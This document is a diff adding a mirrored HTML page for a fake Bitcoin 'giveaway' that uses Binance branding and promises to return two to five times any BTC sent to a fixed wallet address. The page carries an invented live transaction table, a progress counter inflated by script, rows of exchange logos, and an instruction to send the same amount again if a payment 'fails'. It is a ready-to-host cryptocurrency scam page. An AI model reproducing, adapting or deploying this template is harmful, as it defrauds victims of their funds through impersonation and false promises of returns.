@@ -1,0 +1,361 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from /btc by HTTrack Website Copier/3.x [XR&CO'2014],  09:18:39 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Participate with Bitcoin </title>
+    <link rel="stylesheet" href="assets/font-awesome-4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="assets/style.css">  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script></head>
+<style>
+    table {
+    border-collapse: collapse;
+    border-radius: 0;
+    width: 100%;
+}
+thead {
+    background: #e7e6e6;
+}
+th,
+td {
+    padding: 10px 5px;
+    border: 1px solid #e7e6e6;
+    font-size: 11px;
+    color: #262727;
+}
+td:nth-child(1) {
+    color: dodgerblue;
+}
+
+.table-call-toggle {
+    animation: pop linear infinite;
+    animation-delay: 0.5s;
+    animation-duration: 1s;
+}
+@keyframes pop {
+    from {
+        background: #fdfd75c7;
+    }
+    to {
+        background: white;
+    }
+}
+@media screen and (min-width: 986px) {
+    .popup {
+        width: 40%;
+        height: 101%;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -22.5em) !important;
+        line-height: 1px;
+    }
+
+}
+
+</style>
+<body>
+    <div id="modal"></div>
+    <!-- popup -->
+    <div class="popup">
+        <div class="popup-item">
+            <div class="popup-header">
+                <b>Generated Address</b>
+                <span class="close-btn">X</span>
+            </div><br><br><br>
+            <center><img src="https://chart.apis.google.com/chart?cht=qr&amp;chs=300x300&amp;chl=bc1q8n9x0xdf4nxexmcdz59c08qwame0z0s5hgkdp3&amp;chld=H|0" width="150px">
+                <p style="padding: 10px 0; margin-bottom: -20px;">O Confirmation</p>
+                <img src="images/Get%20your%20183%20ETH%20now%21-1.svg" width="70px">
+            </center><br>
+            <hr style="padding: 10px 0; border: 1px solid transparent; border-bottom: 1px solid #dbd8d8; "><br><br>
+            <form action="#" method="post">
+                <label for="">Amount</label>
+                <input type="text" id="input-three" readonly><i class="fa fa-copy" onclick="copy()"></i>
+
+                <label for="">Generated Address</label>
+                <input type="text" value="bc1q8n9x0xdf4nxexmcdz59c08qwame0z0s5hgkdp3" id="generated_address" readonly><i
+                    class="fa fa-copy" onclick="copy2()"></i>
+
+                    <center><button type="text" value="bc1q8n9x0xdf4nxexmcdz59c08qwame0z0s5hgkdp3" id="generated_address" onclick="copy2()" readonly>Copy Address</button></center>
+
+            </form>
+        </div>
+    </div>
+    <!-- popup -->
+
+    <div class="fixed-width"><br><br>
+        <div class="wrapper-img">
+            <center><img src="images/binance.png" style="width: 300px;"></center>
+        </div><br><br>
+        <div class="wrapper-one">
+            <div class="wrapper-one-text">
+                <p style="padding: 10px; color: white; line-height: 30px; font-family: sans-serif;">To verify your Bitcoin address, just send from 0.01 to 5 BTC to the generated address below and get from 0.5 to 25 BTC  sent back to the address you sent BTC from or the one you specified below, you will get double of what you send to the giveaway address.
+                    <br><br>
+
+                    In this event, participant will get 5x  of what they send to the giveaway address within 4 to 8 minutes which can be traded on any exchange
+                </p>
+                <h1 style="color: dodgerblue; padding: 10px;">How to Participate</h1>
+                <p style="padding: 20px 50px; line-height: 20px;">
+                    Step1: Make sure you have at least 0.01 BTC or above in your wallet<br><br>
+                    Step2:  Enter the amount you wish to participate with below.<br><br>
+                    Step3: Enter your BTC address (optional)<br><br>
+                    Step4: Click the "Generate Payment" button to generate the payment address.<br><br>
+                    Step5: Click "Copy Address" to send the amount you have entered to the giveaway<br><br>
+                    Step6: Confirm payment.<br><br>
+                    Step7: Wait for at least 4 - 8 minutes.
+
+                <p style="padding-left: 20px;"> The 5x bonus will be sent to the address you entered or the one you sent the BTC from.</p><br><br>
+                <i style="font-size: 13px; margin: 10px 20px">If the transaction does not process correctly, please try
+                    again by sending the same amount to the Generated address, and it should go through. Your original
+                    transaction will merge with the new one, and the bonus for the two will be sent back.</i><br></br>
+                </p>
+            </div>
+        </div><br><br>
+        <div class="wrapper-two" style="margin: 0 10px; background: #041138; border-radius: 10px;">
+            <div class="wrapper-two-form">
+
+
+                <article>
+                    <label for="Amount" style="margin-bottom: 5px;">Amount:</label>
+                    <img src="images/btc.svg" class="input-img">
+                    <input type="text" style="margin-bottom: 25px;" id="input-one" required>
+                    <i class="fa fa-exchange fa-5x"></i>
+
+                </article>
+                <!-- <br><br> -->
+                <article>
+                    <label for="bonus">Bonus:</label>
+                    <img src="images/btc.svg" class="input-img" style="margin-left: 10px;">
+                    <input type="text" id="input-two" required><br>
+                </article>
+            </div>
+            <i class="fa fa-arrows-alt-v fa-1x icon-v"></i>
+            <i class="fa fa-arrows-alt-h fa-1x icon-h"></i>
+
+            <div class="address">
+                <label for="bonus">Address:</label>
+                <input type="text" placeholder="Enter your BTC address" required><br>
+            </div>
+
+            <center><button class="generate">Generate Payment</button></center><br><br>
+            <p id="msg" style="text-align: center; color: red;"> Amount should be within 0.01 BTC to 5 BTC</p>
+
+            <p style="color: #0ed4e2; font-family: sans-serif; text-align: center;">Last chance to get your BTC!</p><br>
+            <center>
+
+                <div id="progress-count" style="color: white; font-weight: bold; transform: translateY(30px);"><span id="p_value">175</span> / 15000</div>
+                <div class="progress" style="height: 40px; width: 90%; background: #111A33">
+                    <div class="progress-bar progress-bar-striped active"  id='progress-item' role="progressbar" aria-valuenow="40"
+                        aria-valuemin="0" aria-valuemax="100" style="width:20%;">
+                    </div>
+                </div>
+            </center>
+            <br><br>
+            <p style="color: white; font-size: 14px; text-align: center;">Support Exchange</p><br>
+            <div class="support-grid">
+                <article>
+                    <img src="images/log1.ico" width="25px">
+                    <span>BINANCE</span>
+                </article>
+
+                <article>
+                    <img src="images/upbit.png" width="25px">
+                    <span>UPBIT</span>
+                </article>
+
+                <article>
+                    <img src="images/okes.png" width="25px">
+                    <span>OKEX</span>
+                </article>
+
+                <article>
+                    <img src="images/tano.png" width="25px">
+                    <span>REMITANO</span>
+                </article>
+
+                <article>
+                    <img src="images/tox.png" width="25px">
+                    <span>MERCATOX</span>
+                </article>
+
+                <article>
+                    <img src="images/luno.png" width="25px">
+                    <span>LUNO</span>
+                </article>
+
+                <article>
+                    <img src="images/coinsph.png" width="25px">
+                    <span>COINS.PH</span>
+                </article>
+
+                <article>
+                    <img src="images/upbit.png" width="25px">
+                    <span>COINBASE</span>
+                </article>
+
+                <article>
+                    <img src="images/yobit.ico" width="25px">
+                    <span>YOBIT</span>
+                </article>
+                <br><br>
+            </div>
+        </div>
+        <div class="wrapper-three">
+            <div class="table-content">
+                <table>
+                    <thead>
+                        <th>Txn Hash</th>
+                        <th>Time</th>
+                        <th>From</th>
+                        <th></th>
+                        <th>To</th>
+                        <th>Value</th>
+                        <th>[Txn Fee]</th>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>FSDcns3eE3...</td>
+                            <td>now</td>
+                            <td>23JSDN23Nmm...</td>
+                            <td><button class='btn1'>IN</button></td>
+                            <td>asd23ASDF2...</td>
+                            <td>0.14BTC</td>
+                            <td style="font-size: 10px;">0.0072</td>
+                        </tr>
+                        <tr>
+                            <td>lDNCAss2323...</td>
+                            <td>now</td>
+                            <td>mwto23SCNX...</td>
+                            <td><button class='btn2'>OUT</button></td>
+                            <td>SDDedscaAF2...</td>
+                            <td>0.54BTC</td>
+                            <td style="font-size: 10px;">0.0012</td>
+                        </tr>
+
+                        <tr>
+                            <td>GDNCASkl23...</td>
+                            <td>1 min ago</td>
+                            <td>23JLSDN2NSAm...</td>
+                            <td><button class='btn2'>OUT</button></td>
+                            <td>SDs32sdvvF2...</td>
+                            <td>0.53BTC</td>
+                            <td style="font-size: 10px;">0.0045</td>
+                        </tr>
+
+                        <tr>
+                            <td>sLCNaswejSC...</td>
+                            <td>1 min ago</td>
+                            <td>sdj44SDVsdnlNr...</td>
+                            <td><button class='btn1'>IN</button></td>
+                            <td>dasJLSN1233...</td>
+                            <td>0.21BTC</td>
+                            <td style="font-size: 10px;">0.0012</td>
+                        </tr>
+
+                        <tr>
+                            <td>pasot32SDJVN...</td>
+                            <td>2 min ago</td>
+                            <td>NSDW12d3QQc...</td>
+                            <td><button class='btn2'>OUT</button></td>
+                            <td>SDL232dsjJJAS...</td>
+                            <td>1.14BTC</td>
+                            <td style="font-size: 10px;">0.0342</td>
+                        </tr>
+
+                        <tr>
+                            <td>kGVSQl2323...</td>
+                            <td>3 min ago</td>
+                            <td>vw31SDN23Nmm...</td>
+                            <td><button class='btn1'>IN</button></td>
+                            <td>sdv3312ASDF2...</td>
+                            <td>3.42BTC</td>
+                            <td style="font-size: 10px;">0.0312</td>
+                        </tr>
+
+                        <tr>
+                            <td>SDJajksdl3209...</td>
+                            <td>3 min ago</td>
+                            <td>BSDCW2sSDNC...</td>
+                            <td><button class='btn1'>IN</button></td>
+                            <td>SDJAKF2323NS...</td>
+                            <td>3.03BTC</td>
+                            <td style="font-size: 10px;">0.0212</td>
+                        </tr>
+
+                        <tr>
+                            <td>l23svSDCAD23...</td>
+                            <td>4 min ago</td>
+                            <td>2Nmm4dDNVSA...</td>
+                            <td><button class='btn2'>OUT</button></td>
+                            <td>asASDV21SV2...</td>
+                            <td>0.54BTC</td>
+                            <td style="font-size: 10px;">0.0442</td>
+                        </tr>
+
+                        <tr>
+                            <td>asdSAEN231s...</td>
+                            <td>5 min ago</td>
+                            <td>sdasWSDN23N...</td>
+                            <td><button class='btn1'>IN</button></td>
+                            <td>asd23ASDF2...</td>
+                            <td>1.01BTC</td>
+                            <td style="font-size: 10px;">0.0012</td>
+                        </tr>
+
+
+                    </tbody>
+
+            </div>
+        </div>
+    </div>
+    <script src="assets/main.js"></script>
+    <script>
+        var x = 4007;
+setInterval(() => {
+    x += 9;
+    progress_bar.style.width = x / 20 + 'px';
+    p_value.textContent = x;
+}, 100000);
+
+generate.addEventListener('click', function () {
+    if (input1.value == "" || input2.value == "") {
+        msg.style.display = 'block';
+    } else if (input1.value >= 5.1 || input1.value <= 0.04) {
+        msg.style.display = 'block';
+    } else {
+        modal.style.display = 'block';
+        popup.style.display = 'block';
+        msg.style.display = 'none';
+    }
+})
+
+setInterval(() => {
+    const xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function () {
+        table_content.innerHTML = xhr.responseText;
+    }
+    xhr.open('GET.html', 'ajax_table.html', true);
+    xhr.send();
+}, 5000);
+
+input1.addEventListener('keyup', function () {
+    if (input1.value >=5) {
+        input2.value = input1.value * 3;
+        input3.value = input1.value;    
+    }
+})
+
+    </script>
+</body>
+
+
+<!-- Mirrored from /btc by HTTrack Website Copier/3.x [XR&CO'2014],  09:18:40 GMT -->
+</html>
